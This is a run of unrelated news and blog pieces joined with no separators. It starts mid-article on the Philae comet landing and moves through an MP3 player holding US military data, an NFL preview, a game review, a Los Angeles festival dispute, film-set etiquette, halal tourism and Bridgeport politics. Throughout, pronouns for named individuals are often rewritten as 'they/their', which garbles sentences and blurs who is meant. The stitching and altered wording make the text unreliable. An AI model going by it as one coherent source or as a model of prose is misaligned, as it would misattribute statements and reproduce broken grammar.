The goal: the first laboratory research into the primeval matter of the Solar System -- ancient ice and dust that, some experts believe, may have helped to sow life on Earth itself.
According to this theory, comets pounded the fledgling Earth 4.6 billion years ago, providing it with complex organic carbon molecules and precious water.
Rosetta has already sent home fascinating data on the comet, but Philae will provide the first boots-on-the-ground assessment, using 10 instruments to study the comet's physical and chemical composition.
Like Rosetta, it will wield a mass spectrometer, a high-tech tool to analyse a sample's chemical signature, aimed at drawing up a complete carbon inventory.
The showstopper find would be molecules known as left-handed amino acids, the European Space Agency (ESA) says.
"These are the 'bricks' with which all proteins on Earth are built," it says.
- Nail-biting -
But getting Philae into position will be a white-knuckle ride.
After its launch in 2004, Rosetta spent 10 years zig-zagging around Earth and Mars, using the planets' gravitational pull as a slingshot to build up speed to reach its prey, Comet 67P/Churyumov-Gerasimenko.
But when Rosetta finally caught up with it in August, it witnessed a sight that caused despondency back on Earth.
Far from being a simple potato shape, "67P" turned out be two gnarled lobes about four km across joined by a narrow neck.
It looked like an super-dark rubber duck, ravaged by aeons in orbit, turning slowly in space.
Its surface was a nightmare of crests and gullies, studded with hundreds of rocks as high as 50 metres (165 feet) and wicked slopes with an incline greater than 30 degrees.
This was a huge, unexpected problem, said Francis Rocard, a French astrophysicist.
"It took a billion calculations to find a decent landing site" -- one offering a fair chance that Philae could survive and meet scientific goals, they said.
If final "go/no-go" assessments give the green light, Philae will separate from Rosetta about 20 kilometres (12 miles) from the comet at 0835 GMT on Wednesday.
"Then it's a very gentle freefall for the next seven hours," said Sylvain Lodiot, in charge of flight operations.
After that comes the hard bit.
No one knows what a comet's surface is like.
Is it hard and crusty, like a shell? Crumbly? Slippery? Is it brittle -- will it crack, causing Philae to sink into some fudgy or spongey substance below?
Seeking to cover all the possibilities, Philae's designers have equipped the lander with three outstretched legs designed to dampen the impact.
When the lab touches down, it will fire two harpoons to secure it to what -- hopefully -- will be a robust surface, while a thruster on top of the lander will fire to cancel out bounce. Ice screws in the lander feet will deploy for extra grip.
The chances of success? "Seventy percent," said Gaudon, admitting to days of doubt that the chances were much better than one in two.
"We need to be lucky," added Andrea Accomazzo, flight director.
And only then can Philae start its real mission of analysing the makeup of the comet.
Batteries will be enough to keep the probe going for 60 hours, but recharging from sunlight "could keep us going until March," said Rocard.
The buzz from scoring an iPod for $15 undoubtedly wore off quickly for one New Zealand man. Instead of a working MP3 player that could be loaded up with tunes, Chris Ogle found a broken iPod filled with 60 pages of US military data and personally identifying information.
Update: Sleuthy Arsians pointed out that the MP3 player in this story is in fact not an iPod. The specific manufacturer and model is not known, but judging from CNN's video coverage and interview, the MP3 player could very well be a DNT MP3 Fun200 (PDF link).
The files Ogle found on the MP3 player contain the names and personal details of US soldiers, including some who served in Afghanistan and Iraq. There are no details on exactly how many personal records are contained within the documents (most of which date back to 2005), but they also have information on mission briefings and equipment deployment.
This incident is probably not the worst breach of military data in recent memory. About a year ago, a UK military recruitment officer's notebook containing over 600,000 personally identifying, unencrypted records was stolen from their car. In 2007, the US military began clamping down on "milbloggers" who may have inadvertently been giving away too much information to the enemy by posting about day-to-day base operations on increasingly popular public blogs. Of course, there is also Gary McKinnon, who is responsible for the "biggest military hack of all time." While McKinnon wasn't exactly snooping for the bad guys, they did manage to break into various systems across the US Army, Navy, Air Force, NASA, Pentagon, and Department of Defense in search for proof that aliens exist.
Still, Ogle's situation is a bit bizarre in that no one knows how or why this sensitive information was stored on an iPod, or how that MP3 player slipped out to a used hardware vendor. According to the Australian Broadcasting Corporation (ABC), some of the phone numbers from the MP3 player's records still work, and the identified individuals indeed picked up on the other end.
"The more I look at it, the more I see and the less I think I should be [seeing]," Mr Ogle told ABC. They say they will hand the player over to the US Defense Department should it ever ask.

The Vikings are catching the Lions at just the right time.
Yes, Minnesota is coming off an ugly loss Thursday against the Packers, but this game is different.
For one thing, Teddy Bridgewater is back, and this offense is an entirely different unit with them under center. Plus, the Vikings have more time to prepare and recover for Sunday's game than Detroit.
More important, the Lions are trending the wrong way. They're coming off a loss to Buffalo in which Bills quarterback Kyle Orton was making just their second start in three years. The Lions have a very tough defense, but their offense has been struggling to put points on the board, despite all the famous names and high expectations.
Without receiver Calvin Johnson, who is injured, there to play pitch and catch any time they like, Matthew Stafford's mistakes and limitations come to the front.  They are still inaccurate and makes costly errors at the wrong time. Their arm is second to none in the NFL, but being a great quarterback is about so much more than your arm, and they still haven't put it all together.
As for their running game, who knows who will be carrying the ball for the Lions on Sunday? Joique Bell is still working their way through the concussion protocol, and Reggie Bush and Theo Riddick are dealing with injuries of their own. At the end of the game, the last man standing was a running back I had never heard of, George Winn. Everybody in the league knows that losing Adrian Peterson affects Minnesota's offense, but I have confidence in Jerick McKinnon and Matt Asiata.
Minnesota's defense can keep Detroit's offense in check, but it will need help from the offense. No turnovers are a good place to start. That would keep the defense off the field, and give it longer fields to defend. Then comes the notion of breaking down the Lions defense, which is tops in the league in yards allowed and second in points.
I'm looking to see a bit more creative thinking from the offense this week.
First of all, find ways to get the ball in Cordarrelle Patterson's hands. Even counting their work on special teams, they touched the ball only five times last week. That's not even close to enough. If he's still learning to play as an NFL wide receiver, with the full arsenal of routes and moves, that's fine, but don't forget to work in simple ways to give them the ball and see what happens.
In Week 1, the Vikings handed Patterson the ball on running plays a few times. Work that back into the game plan. Look their way more often on short, easy throws, because it doesn't take much for them to spring loose for a big play.
I hope this Vikings team is angry after last week's 42-10 loss at Lambeau Field. Winning in the NFL is a lot of fun, but it's when you lose that you learn the most. That's when you should be driven to get back into the film room, to go back to practice and learn to play better.
This is a young team, but they have some very tough guys and good coaches who I believe will keep the team focused and ready to compete.

More and more teachers are discovering new ways of keeping their students' attention focused on the classroom and the class in session. One way which has proven itself worthy of mention is the use of video games.
Video Games and Education – The Future?
Of course, video games in the classroom have the potential to be a powerful learning tool. Games were used for teaching and educating purposes probably since the dawn of Man. Video games, however, posed an interesting situation. On the one hand, games are an effective way of approaching education in most cases. On the other hand, this is video we are talking about, and that has different criteria and consequences.
When used in a hands-on, creative and safe classroom environment – video games can add a lot to an otherwise dull session of teaching. Along with instruction and guidance from a teacher, video game classrooms can be a viable method of passing down information, encouraging critical thinking, improving motor skills, and engaging the students both as a class and as individuals simultaneously.
Studies on education and video games have been conducted since the 1970's, and with the birth of advanced gaming consoles and the World Wide Web in the 1990's, questions regarding its legitimacy and place in a student's life began to stream in a constant, nonstop parade.
The naysayers point their finger towards incidents like the Columbine shooting, citing its alleged link to video games like Doom and Wolfenstein 3D. There is no doubt that in the wrong hands, video games can be a very disturbing thing. However, is that enough to condemn the entire notion of classroom gamification?
Experts have still not found enough evidence to support the claim that video games are linked to the negative attributes associated with them. This is an ongoing debate which has even reached the floors of the US congress.
In my experience – it isn't at all about the game, but rather about the person playing the game. Nothing will ever fully replace a textbook, an encyclopedia, or a qualified teacher. However, video – and that includes video games – is a big part of the future of education.
Much like the chalk and board that have been replaced by projectors, laptop computers, and PowerPoint presentations – we will find that video is one of the best ways to send and receive the information we want to spread. It's all a question of how we approach it, and of the amount of reliability we attribute to such tools and methods.
TCU got some big news on Thursday night as highly touted junior quarterback Brennan Wooten from Marble Falls, Texas has committed to the Horned Frogs.
Proud to announce that I have just committed to TCU! #gofrogs #TCU #fearthefrog — Brennen Wooten (@BWQB12) July 25, 2014
Wooten is rated as the No. 13 quarterback by Scout.com, and is a consensus 4-star recruit in the 2016 class. Wooten is entering their junior year at Marble Falls High School. They were being recruited hard by Sonny Cumbie, who also sent out a tweet tonight, seemingly regarding the commitment, that just said #ATMO16 or "Air That Mother Out."
Wooten stands at 6-foot-2, and holds offers from Akron, Boise State, Clemson, Houston, Kentucky, TCU and Tulsa, and was being looked at very closely by Texas, Oklahoma, Arkansas and a few others. Obviously, there is a long way to go in keeping the kid committed, as their signing day isn't until the first Wednesday in February 2016, but this is a commitment that should be celebrated. It's another sign that the right guys are at the helm of the offense.
Congrats, Brennan, and welcome to the family.
Lost among this week's barrage of awesome new video games is The Last Story, a role-playing game that's slipped pretty damn far under gamers' radars considering it was designed and directed by the man who created Final Fantasy.
You might be tempted to ignore this one. It's for Wii. You probably haven't touched yours in a while. Maybe it's in the closet, collecting dust with your Ninja Turtle action figures. Maybe you still haven't finished Xenoblade (it's hella long). Maybe you're playing Darksiders II or Papo & Yo or waiting on the new Mario game. Maybe you were just going to let this one pass by.
Don't. The Last Story is one of the best role-playing games you can get on a console today—and one of the best I've played in years.
Maybe it's the effort. Hironobu Sakaguchi, the infamously mustachioed ex-Square maestro responsible for shaping the childhood of anyone who grew up with games like Final Fantasy and Chrono Trigger, spent almost a year-and-a-half building the combat system for The Last Story. They and their team looked at Japanese games. They looked at Western games. They prototyped. They tweaked. And Sakaguchi, directing their first game since Final Fantasy V almost two decades ago, didn't leave the lab until they had forged a set of systems they were proud to play.

The resulting product is sort of a hybrid between the best of Japanese and Western game design, a combat system that blends first-person shooting, stealth, strategy, and hack-and-slash action. In theory, it sounds silly. In practice, it's transcendent.
See, what makes The Last Story special is that it takes you to a battlefield and says, "Hey, you're on a battlefield!" Fights are frantic and chaotic, almost the medieval version of a Western shooter like Gears of War or Call of Duty (minus the guns and ridiculous bro chatter). You control Zael, a Genuine Hero and member of a charming group of mercenaries who fight together in groups of four or five. They're not your average RPG troupe; as your party moves through dungeons and caverns, they will maneuver around like a battle-hardened team, hiding behind pillars and flanking doorways as you sneak through enemy fortresses and mystical forests.

In combat, they'll all do their own thing, leaving you alone to control Zael. No complaints here. Zael is a monster-disemboweling wrecking ball equipped with a sword for slashing, a crossbow for first-person sniping, and special skills like an ultra-powerful sneak attack and an attention-drawing tank move that can also revive allies. You can bark orders at your party—especially helpful if you want them to cast spells—but you'll mostly be focused on your own action.

(Important note: If you play The Last Story, be sure to go into the options and change "Attack Type" from Automatic to Manual. This changes your modus operandi from "run at an enemy and watch your character automatically swing their sword" to "run at an enemy and swing your character's sword." In other words, this turns it into an actual video game. I can't imagine enjoying the combat without this switch.)
Every battle is scripted. There are no random encounters. Battlefields are constructed in deliberate, careful fashion, breakable environments and all. So whether you're running away from soldiers in the narrow alleys of a crowded city or sneaking behind rocks to get in proper position to snipe a bunch of giant ogres before you get smashed, it'll feel like every moment was crafted just for you. There are no filler battles. This is a game that respects your time.
There's variety, too. Your team might start off near a hedge maze, right behind a group of nasty skeleton warriors who don't know you're there. You can foolishly charge in and try to take them all out with swords and spells. Or you could sneak around corners of the maze, carefully sniping each one individually, baiting it closer to you so you can smack it down without alerting its allies.
Advertisement
Another battle might drop you right into the middle of a chaotic brawl. You won't even have time to enter first-person mode and pull out your crossbow. You'll just have to fight.
And then there are the bosses. Oh, the bosses. I won't spoil any of them, but they're remarkably fun to take down. Almost Zelda-like. Okay, if you absolutely insist, I'll spoil one: One particularly devious fight pits you against a group of doppelgangers who take the shapes of your party members. During this devious fight, you'll also be able to attack your actual party members. In the frenzy, it can be awfully hard to tell which doppelgangers are actually your friends, who you will accidentally attack. Often. Get ready to be yelled at. A lot.
"This all sounds great," you might be saying. "What's the downside?" Well, like Xenoblade before it, The Last Story is a game saddled by its system. It's too pretty for the Wii. You might find yourself hamstrung by technical issues. Sometimes it'll take a second or two before a cut-scene starts. The lag is occasionally infuriating. The camera is an unforgivable mess.

This is all offset by the wonderful localization, the excellent British voice acting, the lovely music (composed by the legendary Nobuo Uematsu), the thoroughly interesting characters, the love story that doesn't treat you like a child, and the plot that takes itself seriously but not too seriously.
An RPG is successful when it resonates with your emotions, when it makes you feel like you're somewhere else, someone else, something else. Whether the characters are adventuring through an exciting new world or just fighting to protect their city, whether the game is turn-based or grid-based or non-stop high-octane action, what matters is that it makes you feel something extraordinary.

The Last Story is pretty damn good at that.
Human Rights Music Festival Blacklisted in Los Angeles Chinatown
The refusal of a venue to host a music and arts festival on human rights in China has raised concerns about Chinese censorship in the United States
A music festival that seeks to raise human rights issues in China was blocked from its original venue, a state park in Los Angeles' Chinatown, following a dispute between the festival's organizers and a local community leader.
George Yu, president of the Chinatown Business Improvement District, said they won't endorse the “Blacklisted Music + Arts Festival” being held at the Los Angeles State Historic Park unless the organizers stop calling attention to Tibetan independence, environmental pollution, and forced organ harvesting in China—issues that the Chinese regime considers out of bounds for discussion
The organizers and host of the festival said that Yu is practicing discrimination by denying them use of the park unless they practice self-censorship. They also feel that the “blacklisting” of Blacklisted bears similarities to other episodes when the Chinese communist regime has interfered in overseas affairs.
‘Locked In,' Then Locked Out
Blacklisted is “dedicated to breaking the silence on injustice and censorship, with a focus on China,” according to its official website. The festival features music acts like moe., Citizen Cope, and Talib Kweli, and also includes an outdoor market, martial arts performances, and meditation workshops.
Blacklisted will be emceed by Anastasia Lin, the reigning Miss World Canada and human rights activist, as well as Chris Chappell, the host of China Uncensored, an internet satire show that seeks to expose the Chinese Communist Party's propaganda.
Blacklisted's producer Nick Janicki applied for a permit with California State Parks in December, and was informed on Jan. 17 that their festival was “locked in” for July 29 at the Los Angeles State Historic Park.
But in mid-May, the department withheld issuing a permit to Janicki after they met with Chinatown community leader Yu.
During the meeting on May 12, which Janicki scheduled at the State Parks's request, Yu first asked Janicki to take down videos on the festival's website discussing Tibetan freedom, slave labor, environmental destruction, and other human rights issues in China. Janicki agreed and followed through with Yu's request.
Then Yu kept insisting that “there can be no Falun Gong presence” at the festival, Janicki said in an interview. “No Falun Gong banner, no Falun Gong booth. … If there's Falun Gong at the event, then you need to take your event elsewhere, and this meeting is over.”
Falun Gong is a practice of meditation and moral discipline that has been persecuted in its homeland of China since 1999. It is based on the principles of truthfulness, compassion, and tolerance.
Janicki told Yu that they couldn't exclude Falun Gong because its practitioners were one of the main groups being targeted for forced organ harvesting by the Chinese regime. On May 18, Yu informed Janicki by email that their community couldn't support an event that promoted “anti-China sentiments.” The parks department followed up in stating that they won't be “moving forward” with Blacklisted.
“This is a clear case of discrimination by the head of the Chinatown Business Improvement District,” said Kate Vereshaka, Blacklisted's artistic director. “It's very concerning that Chinatown can be given authority over what United States citizens can or can't do in a public place.”
Censorship Abroad
The Blacklisted organizers also found troubling what they suspect to be a hint of the Chinese regime's efforts to influence overseas Chinese communities.
Janicki recalled Yu saying during their May 12 meeting that they had received “calls from China.”
But Yu denied receiving such calls in a telephone interview with China Uncensored producer Matt Gnaizda. “We are a business improvement district. We have zero relationship with the Chinese government. Our responsibility is to our community,” Yu told Gnaizda.
Attempts by The Epoch Times to reach Yu on their cell phone, and via email to the Chinatown Business Improvement District, were unsuccessful.
Chappell of China Uncensored said that the manner in which the music festival was blocked “fits the Chinese Communist Party's pattern of exporting censorship overseas.”
Chappell added: “Sometimes censorship comes in the form of Chinese embassies or consulates directly making phone calls to stop something. Other times, it comes in the form of general Chinese community pressure to conform to the Party's stance on Falun Gong, Tibetans, or other groups.”
The Chinese regime has long engaged in operations to infiltrate Chinese communities abroad, and sway the loyalties of the Chinese diaspora toward the regime.
For instance, the Chinese regime has long sought to influence and control messaging in Chinese media in the United States, according to a study by the Jamestown Foundation's China Brief. The regime's four main tactics used are directly owning the media, using economic ties as leverage, purchasing broadcast time and advertising space, and deploying agents to work in overseas media.
These overseas Chinese media would often conflate China and the Communist Party, and encourage the view that opposition to Party policies, including persecution, is tantamount to being “anti-China.” Some Chinese people living overseas, who are constantly exposed to such reporting, eventually buy into the Party line, according to Chinascope, a Washington-based think tank that specializes in translating and analyzing Communist Party documents.
It is unclear whether the Chinese regime directly or indirectly influenced the blocking of Blacklisted at the Los Angeles State Historic Park. Festival organizers are in discussions with The Reef, a convention center in downtown Los Angeles, as an alternative venue.
“We're using our festival to shine light into the darkness, to inspire compassion, and to unite brave artists who speak the truth,” said host Anastasia Lin in a press release. “The fact that we, ourselves, are now being censored on U.S. soil shows how important this festival is.”
Chappell thinks that the efforts to bar the festival from its original venue ironically highlight the need for such an event.
“By trying to stop the Blacklisted festival, they've now given it great publicity,” they said.
Film Set Etiquette is very important on set and having bad set etiquette can go as far as getting you fired or put on someone's blacklist. Bad etiquette is something even the most experienced person is guilty of from time to time, but it is most common with people new to film sets.
The problem is that most new, less experienced people especially ones fresh out of film school or kids that have taken online film courses have an uncontrollable desire to show you just how much they know or how good they can be at every job. What they don't understand is that making those comments and suggestions or doing someone elses job is hurting their career more than doing them good. Soon they will be known for having bad etiquette or being a know-it-all.
In this blog we will talk about general onset behavior as well as behavior in real on set situations…
General Film Set Etiquette:
Drug and alcohol use is frowned upon on set.
Keep you mouth shut and your ears open.
Respect the chain of command.
Be polite, say please and thank you.
Learn people's names. This is a big one, camera department gets to cheat and tape the actors grid that's on the call sheet to the camera, others aren't so lucky.
Be watchful and respectful of your co-workers. Just because farting is okay on the grip truck doesn't mean its okay in front of the talent.
Try to show up a little early. Do some networking, learn where the equipment is, read the call sheet, have a coffee. Do whatever it takes to prepare yourself for the day.
Arrive on set prepared with the tools you need to do your job.
At top of day report to your department head, introduce yourself and be respectful.
When given instructions in person or over the walkie be sure to acknowledge by saying “copy” or “copy that”. Do not copy if you do not fully understand the instructions. Feel free to repeat back, ask questions or do whatever it takes to fully understand what you are being instructed to do.
When in need of a washroom break be sure to tell your boss! In film school you might have been told to ALWAYS tell the Assistant Director as well, that is great in theory, but on larger sets the AD has so much to deal with that they really don't need to know which tech is pooping. You are fine as long as your boss knows and someone is around to cover you. Now, that goes for lower level crew mainly, as a Cinematographer or any higher up position the AD must be told.
Watch your boss and be aware of what is going on in your department and around you.
Work hard, but don't over do it. ‘Work smart, not hard' is a goo motto to follow is a good motto to follow, but that doesn't mean be lazy. Pace yourself, the days are long and there will be plenty of work.
Allow others to do their jobs, don't be a hero. Don't chirp in about things that have nothing to do with you or your department.
If you want to help another department ask them if they need it first. A simple “may I?” before moving a camera case or stand can save you a lot of grief later. The bigger the set the less likely you will be allowed to touch anything that doesn't belong to your department.
Take a call sheet at the top of the day or print one the night before. In most cases many of your questions can be answered by looking at the call sheet
If on a longer job don't be afraid to ask for a one liner, It can help you to be ready for future days.
Communication. When turning on a light, flying in track, dolly or anything in general call it out. Don't just walk on to set with a 10 foot chunk of metal, that's how people get hurt.
Do not just plug items into any available outlet. Never unplug anything. ALWAYS ask an Electric.
Dealing with people directly below you:
When I started off in film I wasn't the nicest to the people below me. I was quite tough on them, but only because I didn't know any other way to be. I was taught a certain way and thought that was the way it was. As I gained more experience and worked with different crews I learned to take traits from techs that I liked and make them my own. Now, I'm still a bastard when I need to be, but am much nicer in general.
Learn everyone's name and be nice to them. Too many gaffers have not cared to learn my name and use it. To them I am expendable (which is true to a certain degree), but that doesn't mean treat me that way. The nicer you are to me the harder I will work for you.
Be patient with the less experienced and try to teach as you go. That doesn't mean take everyone aside and teach them how to set a flag when you're supposed to be dolly gripping. Pick and choose your moments, it's as simple as explaining why you bagged a stand a certain way as you do it.
Don't be afraid to assign tasks or delegate responsibility, even if someone is working for a lower rate or for free that doesn't mean baby them. In most cases people working for free are there for the experience and would be willing to do almost anything within reason.
Appreciate their hard work and thank them graciously. It's a simple as saying “great morning guys, thanks for the hard work” or “awesome work today, thanks” at the end of the day. Even covering one pitcher sometime and saying “thanks” goes a hell of a long way.
Look out for your people! Don't let them get taken advantage of, make sure they are being paid fairly, being well fed and getting their full lunch hours. Why? Because they deserve it, the better paid, well rested and fed they are the better they will make you look and the better you will make your boss look.
Be assertive when you need to be. Don't be too nice because you will be walked all over. I recently had this experience…I had hired two guys to finish up a job with me, it was the last few days of a four-week feature film and I was being overly nice with them. On the next job I found their work to be sloppy, slow and careless. I let them hear it and suddenly they were working well again, they were working the way they did on the first job. Later I realized that I was so nice on the first one that they thought they could get away with being lazy.
Dealing with Production:
If you have a question or concern make sure you are bringing it to the right production team member, don't hassle the director about something the PM should be dealing with and don't ask the PM something that the AD's should be dealing with.
Know the roles of the production staff, it will get your issues dealt with more efficiently.
When you are asked to reply to an email or phone call try to do it as soon as possible. It makes for a very stressful day if you can't get in touch with the crew the day before a shoot starts.
If anything strikes you as odd or concerning on the call sheet let the distributor know as soon as you receive it, don't wait until you are on set and it might be too late.
Keep a copy of the call sheet on you at all times, production doesn't need to be bothered with questions that can be answered if you just read the call sheet.
Don't ignore the call sheet, some people think that all they need to know is what time they show up and then act surprised when there is a location move. Production doesn't spend hours working on them for you not to read them.
Don't be afraid to ask questions or raise concerns, there is a lot going on in a production office and it is possible that things get overlooked.
Sensitive Locations:
Respect the homeowners wishes. If the homeowner is around or you've been given instructions to not unplug something or avoid going in a certain room follow those instructions to a T.
Be cautious with stands and lights. Tennis balls can be attached to each leg or location mats can be placed down.
Careful when removing tape from painted walls or hardwood floors. Although you should be using 2 inch black paper tape (painter tape essentially) it can still cause some damage, so be gentle.
Do your best to return the location to the condition it was in when you arrived. Put back any bulbs you've replaced etc.
If you damage or break something tell Production ASAP. Even if it's something tiny they can easily be doing damage control or figuring out how to repair or replace it.
Dealing with the Sparks:
One of my biggest pet peeves on a film set is when someone asks me for extension cords, then acts weird when I ask what they're plugging in and where. The truth is that I would rather give you every little piece of cable you need, run it all out for you and plug it in for you.
I need to know exactly how much amperage you're running, where you're needing it and for how long. It's not a power trip (no pun intended) there are multiple reasons.
Here's why…
They are balancing the load and need to know exactly how much of the 60 amps is left on that dief.
Based on your power needs they can decide if they can get away with running one line and leaving you a cube tap or if you actually need two lines. Not all sets have endless budgets and often times they only have so much cable.
They need to be sure you are being safe and not doing anything dangerous.
If you do run it yourself you will run it messy and leave a tripping hazard. Guaranteed.
Based on that information here's how to deal with the Electrics:
Tell them that you need a line for a certain item, don't just ask for cable. You could go as far as telling them the wattage, but just saying “Hey, I'd love a line for my smoke machine” is enough. That sentence alone tells them that it will probably be 10-15amps and from there they know exactly what they can do.
When they say they will get to it, they will get to it. Don't pester. Things are prioritized and in many cases there are 5 things that need to happen before they can get you power.
When and if you're done with the line tell someone, don't just leave it laying there. You could also wrap it yourself, but be sure you know the proper way of wrapping cable.
These are your Film Set Etiquette basics, If you have any funny stories feel free to share below.
The second international halal tourism conference took place in Konya, Turkey, May 3-5. The first conference was held in Spain in 2014. The choice of Konya, the city of Rumi, was not by accident. In December 2015, the Islamic Conference of Tourism Ministers designated Konya the capital of Islamic tourism for 2016.
Among the more than 1,000 participants were tour operators, official visitors, travel agents, artists, academics, investors and representatives from the hotel, food, airline and retailer sectors. There were 25 international speakers. The conference gave Turkey the opportunity to invest more and improve its performance in the ever-growing Muslim travel market.
The Arabic word “halal,” meaning “permissible,” is typically applied to food, but the concept is related to any product compliant with Islamic law. In August 2015, CrescentRating, “the world's leading authority on halal travel,” published the eBook “Muslim/Halal Travel Market: Basic Concepts, Terms and Definitions.” According to the publication, halal tourism is practiced by “Muslim travellers who do not wish to compromise their faith-based needs while travelling.” The website of the halal tourism conference states, “Halal Tourism is a form of tourism for Muslims who prefer to utilize services, facilities and activities compliant with Islamic principles.”
In short, halal tourism means that transportation and visits are arranged in accordance with Islamic beliefs. For example, no alcohol is served, and only halal food is offered at meals, that is, meat is slaughtered in the name of Allah, and there are no pork products. Moreover, special attention is given to prayer facilities, with arrows indicating the direction of Mecca in rooms equipped with prayer mats.
Separate recreational facilities, including beaches, are provided for men and women. Beds and toilets are positioned not to face toward Mecca, and bidets are featured in bathrooms. Also characteristic of Islamic hotels, the predominantly Muslim staff wears conservative dress, and there are no nightclubs or non-halal activities. Everything, from logistics to finance, is done according to the rules of Islam.
According to “State of the Global Islamic Economy 2015/16,” a report by Thomson Reuters in collaboration with DinarStandard, global Muslim spending on outbound travel reached $142 billion in 2014, excluding the hajj and umrah. This represents a 6.3% increase from the previous year and 11% of the global expenditure. Muslim outbound tourism expenditure is expected to grow to $233 billion by 2020.
Turkey currently ranks seventh out of 73 select countries in the Thomson Reuters report for the best developed Islamic economy for Muslim travel. As the report explains, the so-called Halal Travel Indicator evaluates countries on the relative strength of the ecosystem they have for the development of the sector, not the overall size of a country in the sector. The rankings are based on metrics like inbound Muslim tourists relative to the country's size, governance (halal-friendly ecosystem), awareness (number of related news articles and events) and travel sector contribution to employment. Malaysia holds the No. 1 spot because of excellent performance in all of the categories. But if Turkey increases its currently low awareness on the topic, it could reap high profits from the growing demand for Muslim-friendly resorts. In this light, although five new halal resorts opened in 2015 in Antalya — a Turkish town on the southern coast known primarily for its beautiful beaches and resorts visited by German and Russian tourists — the Thomson Reuters report still cites “an investment gap and an opportunity for investors” in halal resorts. There are around 15 halal-friendly resorts in Antalya, and some 50-70 in Turkey overall.
Another report, the MasterCard-CrescentRating “Global Muslim Travel Index 2016,” which covers 130 destinations, rates Turkey as the third most popular destination on the Organization of Islamic Cooperation's list of destinations in the global Muslim travel market, behind only Malaysia and the United Arab Emirates.
Taking all this into consideration, it seems that the Turkish government and business sector have decided to pursue a bigger slice of the halal pie. At the conference opening in Konya, Culture and Tourism Minister Mahir Unal said Turkey will speed up work to develop halal tourism. Ramazan Cokcevik, deputy general director in charge of promotion at the Ministry of Culture and Tourism stated at a press conference on May 4, that of around 300 halal-friendly hotels in the world, half of them are in Turkey.
Akin Arikan, director of the Halal tourism conference in Turkey, said that halal tourism has become increasingly popular as a Muslim-friendly travel trend in the last several years. Therefore ambiguity remains in terms of acceptable standards for the halal tourism industry, as there is still no global halal tourism certification system. The Thomson Reuters report mentions that the Turkish Standards Institute began issuing halal hotel certifications in June 2014, and the first hotel to acquire one was the Bera Hotel in Antalya. Meanwhile, the World Halal Union, based in Malaysia, issued a halal certificate to the Adenya Hotel and Resort in Antalya.
In addition to there being opportunities in the halal travel sector, there are also a number of challenges. Among those cited by the Thomson Reuters report are marketing to Muslim travelers without alienating non-Muslims, raising financing for this form of tourism and a lack of standardized concepts of what “Muslim-friendly” means across all countries. Challenges aside, Turkey will likely strive for more leadership in the halal tourism sector.
Considering the shaky security situation in Turkey and the resulting sharp decrease in the number of tourists in the past several months, tourism revenue might continue to drop for the remainder of 2016. Tourists from the Middle East and North Africa and Gulf Cooperation Council countries represent only 3% of the global Muslim population, but 37% of total Muslim travel spending. Luring these tourists would be of paramount importance in diversifying the Turkish tourism market. In addition, Turkey has great potential for faith-based tourism beyond Islam, given its vast and diverse heritage, including Christian pilgrimage and archaeological sites.
Ganim, Finch, Newton and Malloy -- all in one room
Ex-Mayor-turned-felon Joseph Ganim chats with Rosaline Mallory Thursday morning, Feb. 5, 2015 at East End Baptist Church in Bridgeport, Conn. Ganim, who is weighing running for their old job, was there to support a proposal by Gov. Dannel Malloy that will help non-violent offenders return to society. less Ex-Mayor-turned-felon Joseph Ganim chats with Rosaline Mallory Thursday morning, Feb. 5, 2015 at East End Baptist Church in Bridgeport, Conn.

BRIDGEPORT -- A popular mayor toppled by corruption and a governor offering nonviolent offenders redemption walked into the East End Baptist Church on Thursday morning.
And it's a shame the former mayor, Joseph Ganim, left before hearing what fellow Democrats Gov. Dannel P. Malloy and Mayor Bill Finch told the audience about Malloy's plans to help certain felons re-enter society.
Ganim, many believe, is seriously considering challenging Finch for their old job despite having gone to prison for selling the mayor's office to the highest bidder.
They would have walked out of East End Baptist on Thursday emboldened and with a fair share of campaign propaganda, even if that was far from what those gathered intended.
"When it comes to second chances, if you think about it, Bridgeport is a second-chance city," Finch told the small crowd of city and state officials, community leaders and parishioners.
They were at first referring to Bridgeport's efforts to move beyond its industrial past, touting their own work to transition Connecticut's largest city into the 21st century economy.
But then Finch pivoted to Malloy's criminal justice reforms, released Tuesday, that would reduce penalties for drug possession and expand the pardon system so more felons can cleanse their criminal records.
"I'm a firm believer in second chances," Finch said.
Forgiveness was in the air. So was irony.
As they spoke, Finch sat just feet away from a podium where Ganim offered a New Year's Day apology to a welcoming black congregation that was considered the kickoff of their comeback campaign.
Finch at one point, without any indication they were intentionally referring to Ganim's mea culpa, said, "We've all faltered and we know this is a good place to be if you've admitted you've faltered."
"Yes," chimed in the Rev. Charlie Stallworth, pastor of East End Baptist and a state representative friendly with Ganim. "An ideal place."
And since Finch, who is seeking a third term, recently said Ganim and other public officials convicted of corruption should be prevented from again running for office, it was difficult for some at East End Baptist to reconcile that position with the mayor's comments Thursday.
"I think the mayor is a great guy," said Rosalind Mallory, a church member who was chatting with Ganim before the event with Malloy began. "But don't put your finger in other people's eye because it's karma. ... By that judgment you'll be judged."
Newton's law
Ex-state Sen. Ernest Newton is not exactly the best person to represent granting felons second chances.
Having also served time for abusing their office, Newton now faces sentencing after they were convicted Jan. 16 on three charges of illegal practices in campaign financing related to their failed 2012 comeback legislative campaign.
But like Ganim, Newton is still thought highly-of by many in the East End and other of Bridgeport's lower-income neighborhoods.
"Bill Finch is a hypocrite," said Newton. "(He) wants to pick and choose what those `second chances' are."
One of the main goals of Malloy's proposed reforms is to remove the stigma that can prevent offenders from securing employment and doing other things that keep them out of the prison system.
"If you make it impossible for someone to contribute to society through their employment," Malloy, a former prosecutor, said Thursday, "don't be surprised if they are forced into a life of crime, or petty crime at least."
That was not the case with Ganim, who seemingly had it all -- a successful career and growing family -- and went to jail for coveting more. Ganim was convicted in 2003 on federal corruption charges for steering city contracts in exchange for hundreds of thousands of dollars in wine, custom clothes, cash and home improvements.
Released in 2010, Ganim over the past few months has been attending events, particularly within Bridgeport's African-American and Hispanic communities, and making phone calls to potential political allies, testing the waters for a mayoral bid. When they attended the New Year's Day event at East End Baptist, Ganim delivered what could easily have been mistaken as a re-election speech, touting their achievements as mayor.
But what made it even more noteworthy was Ganim, who had never pleaded guilty and for years been accused of showing little to no remorse, took the opportunity to say, "I'm truly sorry."
The Ganim factor
Ganim so far has made no effort to put an end to the speculation about their political ambitions.
Ganim ducked out of Thursday's event after telling a Hearst reporter seeking an interview that they were briefly stepping away.
In a statement afterward, Ganim said, "I was invited and attended to support the governor's Second Chance initiative and applaud their leadership on this."
"I, unfortunately, also had another commitment that prevented me from staying," Ganim said.
One attendee who has worked with felons said in an interview that Ganim should have the right to run for mayor.
